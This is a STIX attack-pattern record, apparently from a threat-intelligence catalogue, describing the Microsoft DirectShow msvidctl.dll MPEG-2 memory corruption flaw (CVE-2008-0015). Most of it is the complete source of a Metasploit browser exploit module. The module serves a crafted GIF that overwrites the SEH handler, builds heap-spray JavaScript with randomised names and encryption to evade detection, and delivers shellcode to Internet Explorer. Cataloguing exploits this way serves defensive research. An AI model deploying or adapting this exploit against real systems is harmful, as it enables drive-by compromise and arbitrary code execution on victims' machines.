{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6ffa1f4f-5b47-4f8d-bc39-e54cd2688fc0",
    "created": "2024-08-14T16:45:12.639084Z",
    "modified": "2024-08-14T16:45:12.639088Z",
    "name": "Microsoft DirectShow (msvidctl.dll) MPEG-2 Memory Corruption",
    "description": " This module exploits a memory corruption within the MSVidCtl component of Microsoft DirectShow (BDATuner.MPEG2TuneRequest). By loading a specially crafted GIF file, an attacker can overrun a buffer and execute arbitrary code.  ClassID is now configurable via an advanced option (otherwise randomized) - I)ruid  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/msvidctl_mpeg2.rb",
            "external_id": "msvidctl_mpeg2.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-0015"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# msvidctl_mpeg2.rb\n#\n# Microsoft DirectShow (msvidctl.dll) MPEG-2 Memory Corruption exploit for the Metasploit Framework\n#\n# Tested successfully on the following platforms (fully patched 06/07/09):\n#  - Internet Explorer 6, Windows XP SP2\n#  - Internet Explorer 7, Windows XP SP3\n#\n# Original exploit was found in-the-wild used to preform drive-by attacks via compromised Chinese web sites.\n# The original exploit can be found here (shellcode changed to execute calc.exe):\n# http://www.rec-sec.com/exploits/aa.rar\n#\n# Trancer\n# http://www.rec-sec.com\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft DirectShow (msvidctl.dll) MPEG-2 Memory Corruption',\n      'Description'    => %q{\n          This module exploits a memory corruption within the MSVidCtl component of Microsoft\n        DirectShow (BDATuner.MPEG2TuneRequest).\n        By loading a specially crafted GIF file, an attacker can overrun a buffer and\n        execute arbitrary code.\n\n        ClassID is now configurable via an advanced option (otherwise randomized) - I)ruid\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Trancer <mtrancer[at]gmail.com>' ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-0015' ],\n          [ 'OSVDB', '55651' ],\n          [ 'BID', '35558' ],\n          [ 'MSB', 'MS09-032' ],\n          [ 'MSB', 'MS09-037' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0', { 'Ret' => 0x0C0C0C0C } ]\n        ],\n      'DisclosureDate' => '2009-07-05',\n      'DefaultTarget'  => 0))\n\n    register_advanced_options(\n      [\n        OptString.new('ClassID', [ false, \"Specific ClassID to use (otherwise randomized)\", nil ]),\n      ])\n\n    @javascript_encode_key = rand_text_alpha(rand(10) + 10)\n  end\n\n  def get_srvhost\n    # If the SRVHOST isn't the default 0.0.0.0, obviously the user wants to\n    # specify, so we will not force source_address()\n    return datastore['SRVHOST'] if datastore['SRVHOST'] != '0.0.0.0'\n    Rex::Socket.source_address(cli.peerhost)\n  end\n\n  def on_request_uri(cli, request)\n\n    if (request.uri.match(/\\.gif$/i))\n\n      print_status(\"Sending GIF\")\n\n      gif =  \"\\x00\\x03\\x00\\x00\\x11\\x20\\x34\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      gif << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      gif << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      gif << \"\\xFF\\xFF\\xFF\\xFF\"\t# End of SEH chain\n      gif << [target.ret].pack('V')\t# SE Handler\n      gif << \"\\x00\"\n\n      send_response(cli, gif, { 'Content-Type' => 'image/gif' })\n\n      return\n    end\n\n    if (!request.uri.match(/\\?\\w+/))\n      send_local_redirect(cli, \"?#{@javascript_encode_key}\")\n      return\n    end\n\n    print_status(\"Sending HTML\")\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Class IDs\n    allclsids = [ # all IDs from the advisory\n      \"011B3619-FE63-4814-8A84-15A194CE9CE3\", # doesn't work\n      \"0149EEDF-D08F-4142-8D73-D23903D21E90\", # doesn't work\n      \"0369B4E5-45B6-11D3-B650-00C04F79498E\", # works\n      \"0369B4E6-45B6-11D3-B650-00C04F79498E\", # works\n      \"055CB2D7-2969-45CD-914B-76890722F112\", # works\n      \"0955AC62-BF2E-4CBA-A2B9-A63F772D46CF\", # works\n      \"15D6504A-5494-499C-886C-973C9E53B9F1\", # works\n      \"1BE49F30-0E1B-11D3-9D8E-00C04F72D980\", # doesn't work\n      \"1C15D484-911D-11D2-B632-00C04F79498E\", # doesn't work\n      \"1DF7D126-4050-47F0-A7CF-4C4CA9241333\", # doesn't work\n      \"2C63E4EB-4CEA-41B8-919C-E947EA19A77C\", # doesn't work\n      \"334125C0-77E5-11D3-B653-00C04F79498E\", # doesn't work\n      \"37B0353C-A4C8-11D2-B634-00C04F79498E\", # doesn't work\n      \"37B03543-A4C8-11D2-B634-00C04F79498E\", # doesn't work\n      \"37B03544-A4C8-11D2-B634-00C04F79498E\", # doesn't work\n      \"418008F3-CF67-4668-9628-10DC52BE1D08\", # doesn't work\n      \"4A5869CF-929D-4040-AE03-FCAFC5B9CD42\", # doesn't work\n      \"577FAA18-4518-445E-8F70-1473F8CF4BA4\", # doesn't work\n      \"59DC47A8-116C-11D3-9D8E-00C04F72D980\", # works\n      \"7F9CB14D-48E4-43B6-9346-1AEBC39C64D3\", # doesn't work\n      \"823535A0-0318-11D3-9D8E-00C04F72D980\", # doesn't work\n      \"8872FF1B-98FA-4D7A-8D93-C9F1055F85BB\", # doesn't work\n      \"8A674B4C-1F63-11D3-B64C-00C04F79498E\", # works\n      \"8A674B4D-1F63-11D3-B64C-00C04F79498E\", # works\n      \"9CD64701-BDF3-4D14-8E03-F12983D86664\", # doesn't work\n      \"9E77AAC4-35E5-42A1-BDC2-8F3FF399847C\", # doesn't work\n      \"A1A2B1C4-0E3A-11D3-9D8E-00C04F72D980\", # doesn't work\n      \"A2E3074E-6C3D-11D3-B653-00C04F79498E\", # doesn't work\n      \"A2E30750-6C3D-11D3-B653-00C04F79498E\", # works\n      \"A8DCF3D5-0780-4EF4-8A83-2CFFAACB8ACE\", # doesn't work\n      \"AD8E510D-217F-409B-8076-29C5E73B98E8\", # doesn't work\n      \"B0EDF163-910A-11D2-B632-00C04F79498E\", # doesn't work\n      \"B64016F3-C9A2-4066-96F0-BD9563314726\", # works\n      \"BB530C63-D9DF-4B49-9439-63453962E598\", # doesn't work\n      \"C531D9FD-9685-4028-8B68-6E1232079F1E\", # doesn't work\n      \"C5702CCC-9B79-11D3-B654-00C04F79498E\", # doesn't work\n      \"C5702CCD-9B79-11D3-B654-00C04F79498E\", # doesn't work\n      \"C5702CCE-9B79-11D3-B654-00C04F79498E\", # doesn't work\n      \"C5702CCF-9B79-11D3-B654-00C04F79498E\", # doesn't work\n      \"C5702CD0-9B79-11D3-B654-00C04F79498E\", # doesn't work\n      \"C6B14B32-76AA-4A86-A7AC-5C79AAF58DA7\", # works\n      \"CAAFDD83-CEFC-4E3D-BA03-175F17A24F91\", # doesn't work\n      \"D02AAC50-027E-11D3-9D8E-00C04F72D980\", # doesn't work\n      \"F9769A06-7ACA-4E39-9CFB-97BB35F0E77E\", # works\n      \"FA7C375B-66A7-4280-879D-FD459C84BB02\", # doesn't work\n    ]\n    clsids = [ # these all work\n      \"0369B4E5-45B6-11D3-B650-00C04F79498E\", # works\n      \"0369B4E6-45B6-11D3-B650-00C04F79498E\", # works\n      \"055CB2D7-2969-45CD-914B-76890722F112\", # works\n      \"0955AC62-BF2E-4CBA-A2B9-A63F772D46CF\", # works\n      \"15D6504A-5494-499C-886C-973C9E53B9F1\", # works\n      \"59DC47A8-116C-11D3-9D8E-00C04F72D980\", # works\n      \"8A674B4C-1F63-11D3-B64C-00C04F79498E\", # works\n      \"8A674B4D-1F63-11D3-B64C-00C04F79498E\", # works\n      \"A2E30750-6C3D-11D3-B653-00C04F79498E\", # works\n      \"B64016F3-C9A2-4066-96F0-BD9563314726\", # works\n      \"C6B14B32-76AA-4A86-A7AC-5C79AAF58DA7\", # works\n      \"F9769A06-7ACA-4E39-9CFB-97BB35F0E77E\", # works\n    ]\n    classid = datastore['ClassID'] || clsids[rand(clsids.size)]\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Setup exploit buffers\n    nops \t  = Rex::Text.to_unescape([target.ret].pack('V'))\n    blocksize = 0x40000\n    fillto    = 500\n\n    # Randomize the javascript variable names\n    msvidctl     = rand_text_alpha(rand(100) + 1)\n    div\t     = rand_text_alpha(rand(100) + 1)\n    j_shellcode  = rand_text_alpha(rand(100) + 1)\n    j_nops       = rand_text_alpha(rand(100) + 1)\n    j_headersize = rand_text_alpha(rand(100) + 1)\n    j_slackspace = rand_text_alpha(rand(100) + 1)\n    j_fillblock  = rand_text_alpha(rand(100) + 1)\n    j_block      = rand_text_alpha(rand(100) + 1)\n    j_memory     = rand_text_alpha(rand(100) + 1)\n    j_counter    = rand_text_alpha(rand(30) + 2)\n\n    host = get_srvhost + \":\" + (datastore[\"SRVPORT\"].to_s)\n    gif_uri = \"http#{(datastore['SSL'] ? 's' : '')}://#{host}\"\n    if (\"/\" == get_resource[-1,1])\n      gif_uri << get_resource[0, get_resource.length - 1]\n    else\n      gif_uri << get_resource\n    end\n    gif_uri << \"/\" + Time.now.to_i.to_s + \".gif\"\n\n    js = %Q|#{j_shellcode}=unescape('#{shellcode}');\n#{j_nops}=unescape('#{nops}');\n#{j_headersize}=20;\n#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;\nwhile(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};\n#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});\n#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});\nwhile(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};\n#{j_memory}=new Array();\nfor(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};\n\nvar #{msvidctl}=document.createElement('object');\n#{div}.appendChild(#{msvidctl});\n#{msvidctl}.width='1';\n#{msvidctl}.height='1';\n#{msvidctl}.data='#{gif_uri}';\n#{msvidctl}.classid='clsid:#{classid}';|\n\n    js_encoded = encrypt_js(js, @javascript_encode_key)\n\n    html = %Q|<html>\n<body>\n<div id=\"#{div}\">\n<script>\n#{js_encoded}\n</script>\n</body>\n</html>|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-07-05",
    "x_mitre_platforms": [
        "win'"
    ]
}